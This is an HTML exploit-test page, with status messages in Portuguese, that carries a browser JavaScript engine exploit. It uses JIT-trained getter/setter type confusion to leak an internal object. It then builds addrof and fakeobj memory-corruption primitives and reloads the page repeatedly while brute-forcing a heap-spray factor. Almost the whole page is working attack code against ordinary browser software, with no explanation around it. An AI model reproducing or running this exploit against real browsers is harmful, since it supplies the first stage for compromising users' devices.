<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <script src="util.js"></script>
    <script src="int64.js"></script>
    <title>Exploit Test</title>
</head>
<body>
    <p id="factors"></p>
    <p id="status"></p>
    <script>
        const minFactor = 1087;
        const maxFactor = 2087;
        let currentFactor = parseInt(localStorage.getItem('currentFactor')) || minFactor;

        if (currentFactor > maxFactor) {
            document.getElementById("status").innerHTML = "Testes finalizados. Nenhum fator válido encontrado.";
            localStorage.removeItem('currentFactor');
            throw new Error("Fim dos testes.");
        }

        document.getElementById("factors").innerText = "Testando factor: " + currentFactor;

        let boxed_arr = new Function();
        boxed_arr.p1 = 1.1;
        boxed_arr[0] = {};

        let getter = new Function();
        getter.p1 = 1.1;
        getter[0] = 1.1;

        let shape = {};
        for (let i = 0; i < 14; ++i) shape['p'+i] = i;

        let shapes = [];
        for (let i = 0; i < 100; ++i) {
            shapes.push({...shape, ['z'+i]: 0x1337});
        }

        function trigger() {
            let object_a = { foo: 1, p1: 1.1 };
            let object_b = {};
            object_b.__defineGetter__('p1', getter);
            object_b.foo = 1;

            function get_getterSetter(type) {
                return (type === 0 ? object_a : object_b).foo;
            }

            for (let j = 0; j < 8e6; ++j) get_getterSetter(j % 2);

            return [getter, get_getterSetter(1)];
        }

        (function pwn() {
            let [getter, getterSetter] = trigger();
            let success = false;
            try { getterSetter.toString(); } catch (e) { success = true; }

            if (!success) {
                document.getElementById("status").innerHTML = "Exploit falhou. Próxima tentativa...";
                localStorage.setItem('currentFactor', currentFactor + 1);
                setTimeout(() => location.reload(), 300);
                return;
            }

            let symbolObject = Object(getterSetter);
            let ref_arr = [];
            for (let i = 0; i < currentFactor; ++i) ref_arr.push(symbolObject.description);

            getter.p13 = 1.1;
            let unboxed_arr = getter;

            function addrof(o) {
                boxed_arr[8] = o;
                return Int64.fromDouble(unboxed_arr[0]);
            }

            function fakeobj(addr) {
                unboxed_arr[0] = addr.asDouble();
                return boxed_arr[8];
            }

            let sample = BigInt(addrof({}).toString());
            if (sample >= 0x200000000n || sample < 0x100000000n) {
                localStorage.setItem('currentFactor', currentFactor + 1);
                location.reload();
                return;
            }

            alert(`SUCCESS!!! Factor válido: ${currentFactor}`);
            document.getElementById("status").innerHTML = "Exploit bem-sucedido!";
            localStorage.removeItem('currentFactor');
        })();
    </script>
</body>
</html>
